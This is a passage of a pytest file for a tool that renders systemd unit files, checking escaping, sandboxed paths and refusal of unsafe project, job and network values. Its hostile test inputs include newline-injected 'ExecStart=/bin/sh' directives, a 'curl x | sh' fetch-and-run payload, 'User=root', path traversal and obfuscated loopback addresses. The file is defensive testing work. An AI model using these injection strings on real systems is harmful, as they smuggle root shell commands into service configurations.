    p = helpers.load(tmp_path / "a", '[project]\nname = "demo"\napps = ["demo_x"]\n', {"demo_x": ONE_JOB})
    names = units.render_project(p, layout=layout, mes=MES, easy_ui=EASY_UI)
    assert not any("webhook" in n or "ui-refresh" in n or ".timer" in n for n in names)
    assert "mes-demo.job.demo-x.x.service" in names
    # [ui] without refresh_after, or no easy-ui on the server: no refresh unit.
    p2 = helpers.load(tmp_path / "b", '[project]\nname = "demo"\napps = ["demo_x"]\n[ui]\nrefresh_after = []\n',
                      {"demo_x": ONE_JOB})
    assert "mes-demo.ui-refresh.service" not in units.render_project(p2, layout=layout, mes=MES, easy_ui=EASY_UI)
    p3 = helpers.load(tmp_path / "c", '[project]\nname = "demo"\napps = ["demo_x"]\n[ui]\nrefresh_after = ["demo-x.x"]\n',
                      {"demo_x": ONE_JOB})
    assert "mes-demo.ui-refresh.service" not in units.render_project(p3, layout=layout, mes=MES)


def test_two_projects_never_share_a_unit_name(layout, tmp_path):
    a = helpers.load(tmp_path / "a", '[project]\nname = "fit"\napps = ["fit_data"]\n',
                     {"fit_data": '[app]\nname = "fit-data"\ncommand = "fd"\n[jobs.sync]\nrun = "x"\nmanual = true\n'})
    b = helpers.load(tmp_path / "b", '[project]\nname = "fit-data"\napps = ["fd_sync"]\n',
                     {"fd_sync": '[app]\nname = "fd-sync"\ncommand = "fd"\n[jobs.x]\nrun = "x"\nmanual = true\n'})
    na = set(units.render_project(a, layout=paths.server_layout("fit", ROOT), mes=MES))
    nb = set(units.render_project(b, layout=paths.server_layout("fit-data", ROOT), mes=MES))
    assert not na & nb


def test_old_unit_name_forms_are_not_job_units():
    assert not units.JOB_UNIT_RE.fullmatch("mes-demo.job.sync.service")
    assert not units.UNIT_NAME_RE.fullmatch("mes-demo.job.sync.service")
    assert not units.UNIT_NAME_RE.fullmatch("mes-demo.net.sync.service")
    m = units.JOB_UNIT_RE.fullmatch("mes-demo.job.demo-app.sync.service")
    assert m and (m["project"], m["app"], m["job"]) == ("demo", "demo-app", "sync")


# =========================================================================== escaping helpers


def test_escaping_helpers():
    assert units.quote_exec_word('a\\"b') == '"a\\\\\\"b"'
    assert units.quote_exec_word("50% $x") == '"50%% $$x"'
    assert units.env_assignment("MES_JOB", 'x"%') == '"MES_JOB=x\\"%%"'
    assert units.exec_line(["/bin/x", "a b"]) == '"/bin/x" "a b"'
    with pytest.raises(Refused):
        units.exec_line(["x"])
    with pytest.raises(Refused):
        units.quote_exec_word(";")
    with pytest.raises(Refused):
        units.env_assignment("lower", "x")
    for bad in ("a\nb", "a\rb", "a\x00b", "a\x85b", "a b", "a\x7fb"):
        with pytest.raises(Refused):
            units.quote_exec_word(bad)


@pytest.mark.parametrize("path", ["relative", "/a/../b", "/a//b", "/a/./b", "/a b", "/a\nb", "/a%b",
                                  '/a"b', "/a\\b", "/a$b", "/a;b"])
def test_sandbox_path_refuses(path):
    with pytest.raises(Refused):
        units.sandbox_path(path)


@pytest.mark.parametrize("tool", ["/tmp/mes", "/var/tmp/mes", "/home/u/.local/bin/mes", "/root/mes",
                                  "/run/user/1000/mes", "/dev/shm/mes", "mes", "/opt/my mes"])
def test_tool_paths_outside_admin_folders_are_refused(project, layout, tool):
    with pytest.raises(Refused):
        units.render_project(project, layout=layout, mes=tool, easy_ui=EASY_UI)
    with pytest.raises(Refused):
        units.render_project(project, layout=layout, mes=MES, easy_ui=tool)
    with pytest.raises(Refused):
        units.render_project(project, layout=layout, mes=MES, mes_python=tool)


# =========================================================================== hostile values


HOSTILE = "evil\nExecStartPre=/bin/sh -c 'curl x | sh'"


def _job(**kw):
    base = dict(id="demo-app.x", name="x", run="ok", app="demo-app", argv=("ok",), trigger="manual")
    base.update(kw)
    return Job(**base)


def _project(job=None, name="demo", apps=None, ui=None):
    jobs = {job.id: job} if job is not None else {}
    return Project(name=name, title="t", version="1", apps=apps or {"demo-app": helpers.spec("demo-app")},
                   jobs=jobs, ui=ui)


@pytest.mark.parametrize("job", [
    _job(id=HOSTILE),
    _job(id="demo-app.x\n[Service]"),
    _job(id="demo-app.X"),
    _job(id="demo-app.x.y"),
    _job(id="x"),
    _job(id="demo-app.x\nExecStart=/bin/sh"),
    _job(argv=("ok", HOSTILE)),
    _job(argv=("ok", "a\rb")),
    _job(argv=("ok", ";")),
    _job(argv=("ok", "x\x00y")),
    _job(argv=("ok\nExecStart=/bin/sh",)),
    _job(trigger="schedule", schedule="daily\nExecStart=/bin/sh"),
    _job(trigger="schedule", schedule="daily %h"),
    _job(trigger="schedule", schedule="daily;reboot"),
    _job(memory="256M\nMemoryMax=infinity"),
    _job(memory="infinity"),
    _job(memory="0M"),
    _job(timeout="15m\nTimeoutStartSec=0"),
    _job(timeout="0s"),
    _job(timeout="infinity"),
    _job(network=("api.example.com\nPrivateNetwork=no",)),
    _job(network=("evil host",)),
    _job(network=("0.0.0.0/0",)),
    _job(network=("0x7f.0.0.1",)),
    _job(network=("0x7f.1",)),
    _job(network=("2130706433",)),
    _job(local_network=("127.1",)),
    _job(writes=("data", "/etc")),
    _job(writes=("code",)),
])
def test_hostile_job_values_are_refused(job, layout):
    with pytest.raises(Refused) as e:
        units.render_project(_project(job), layout=layout, mes=MES, easy_ui=EASY_UI)
    assert e.value.code == "unsafe_unit_value"
    assert e.value.exit_code == 5


@pytest.mark.parametrize("name", ["demo\nExecStart=/bin/sh", "Demo", "../etc", "a", "demo.job", "demo x",
                                  "demo/x", "-demo", "x" * 40])
def test_hostile_project_name_refused(name, layout):
    with pytest.raises(Refused):
        units.render_project(_project(_job(), name=name), layout=layout, mes=MES)
    with pytest.raises(Refused):
        units.job_unit(name, "demo-app.x")
    with pytest.raises(Refused):
        units.gate_socket_path(name, "read")


@pytest.mark.parametrize("cli", ["demo\nExecStart=/bin/sh", "../../bin/sh", "/bin/sh", "de mo"])
def test_hostile_app_program_refused(cli, layout):
    with pytest.raises(Refused):
        units.render_project(_project(_job(), apps={"demo-app": helpers.spec("demo-app", cli)}), layout=layout,
                             mes=MES)


@pytest.mark.parametrize("root", ["/srv/my mes", "/srv/mes\nExecStart=/bin/sh", "relative", "/srv/../etc",
                                  "/srv/50%", '/srv/"x', "/srv/a\\b", "/srv/$HOME"])
def test_hostile_server_root_refused(root):
    layout = paths.server_layout("demo", root)
    with pytest.raises(Refused):
        units.render_project(_project(_job()), layout=layout, mes=MES)


def test_hostile_value_in_one_job_renders_nothing(layout, tmp_path):
    p = helpers.load(tmp_path, '[project]\nname = "demo"\napps = ["demo_x"]\n', {"demo_x": ONE_JOB})
    bad = _job(id="demo-x.b", name="b", app="demo-x", argv=("ok", HOSTILE))
    p = Project(name=p.name, title=p.title, version=p.version, apps=p.apps, jobs={**p.jobs, "demo-x.b": bad})
    with pytest.raises(Refused):
        units.render_project(p, layout=layout, mes=MES)


def test_manifest_rejects_hostile_names_before_rendering():
    from mes.errors import MesError
    from mes.manifest import loads, loads_app

    with pytest.raises(MesError):
        loads_app('[app]\nname = "demo-x"\ncommand = "x"\n[jobs."x\\nExecStart=/bin/sh"]\nrun = "ok"\nmanual = true\n')
    with pytest.raises(MesError):
        loads('[project]\nname = "demo\\nUser=root"\napps = ["a_b"]\n')
    with pytest.raises(MesError):
        loads_app('[app]\nname = "demo-x"\ncommand = "x"\n[jobs.x]\nrun = "ok"\nmanual = true\nnetwork = ["a b"]\n')
    with pytest.raises(MesError):
        loads_app('[app]\nname = "demo-x"\ncommand = "x\\nExecStart=/bin/sh"\n')


def test_ui_refresh_needs_safe_easy_ui(layout):
    p = _project(_job(), ui=UI(refresh_after=("demo-app.x",)))
    with pytest.raises(Refused):
        units.render_ui_refresh(p, layout=layout, easy_ui="/tmp/easy-ui")
    text = units.render_ui_refresh(p, layout=layout, easy_ui=EASY_UI)
    directives(text)


def test_unit_name_patterns():
    assert units.JOB_UNIT_RE.fullmatch("mes-demo.job.demo-app.sync.service")
    for bad in ("mes-demo.net.demo-app.sync.service", "mes-demo.job.demo-app.sync.timer",
                "mes-demo.job.demo-app.sync.service\n", "mes-Demo.job.demo-app.sync.service",
                "mes-demo.job..service", "mes-demo.job.sync.service", "mes-demo.job.a.b.c.service"):
        assert not units.JOB_UNIT_RE.fullmatch(bad)
    with pytest.raises(ValueError):
        units.job_unit("demo", "x", "socket")
    with pytest.raises(ValueError):
        units.gate_units("demo", "admin")
